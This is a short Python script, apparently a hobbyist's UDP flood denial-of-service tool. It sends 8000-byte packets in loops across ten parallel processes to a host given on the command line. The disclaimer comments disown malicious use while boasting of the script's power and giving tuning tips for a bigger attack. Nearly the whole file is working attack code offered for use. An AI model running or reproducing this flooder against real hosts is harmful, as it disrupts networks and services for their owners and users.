# Written by MsonC
# Please DO NOT use this script for any malicious uses!
# as I am not responsible for your actions.
#
# You download it! you take responsiblibity for it!
# As I have stated this script is very powerful. However, That was on my internet and bandwidth
# Your situation may be completly different as in 3Mbps download in 1Mbps Upload. The script I belive (since I have not tested it within that envionment) wouln'd work nearly as well
# as my internet so please don't blame me because the only problem is your internet speed and bandwidth
# Thanks
# Happy Coding, Hacking, and Testing



import socket
import sys
from multiprocessing import Process

#python boot.py host port
#Hit ctrl + C to stop

host = sys.argv[1]
# port = sys.argv[2] # uncomment this line and comment out the line below if you would like to type in your own custom port for the tool
# other wise leave it the same
port = 20

mkstring = lambda(x): "".join(map(chr, (ord('a')+(y%26) for y in range(x))))
packet = mkstring(8000) # 8000 is the string length. DO NOT TOUCH THIS UNLESS YOU KNOW WHAT YOU DOING! THIS IS THE BEST NUMBER THAT I HAVE FOUND SO FAR! you can make it smaller
# for a smaller attack but not much larger

def dos(host, port):

    a = 0
    while (a < 100000): # the loop will end at the number you set it to
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Set up socket connection for UDP AKA DGRAM
        s.sendto(packet, (host, port)) # Send the packet of randomly generated text to the user specifed IP

        a += 1 # Increment A by 1 So the while loop will not be infinite
        print (a)
    s.close() # Close the socket outside of the whileloop. Not sure why it works that way but it just does

if __name__ == '__main__':
    # origin_time = time.time()

    processes = list()
    for i in range(0, 10):
        process = Process(target=dos, args=(host, port)) # Allocate the processes to the above code
        process.start() # Start the processes
        processes.append(process) # Add the proccesses to the list
    for process in processes:
        process.join()
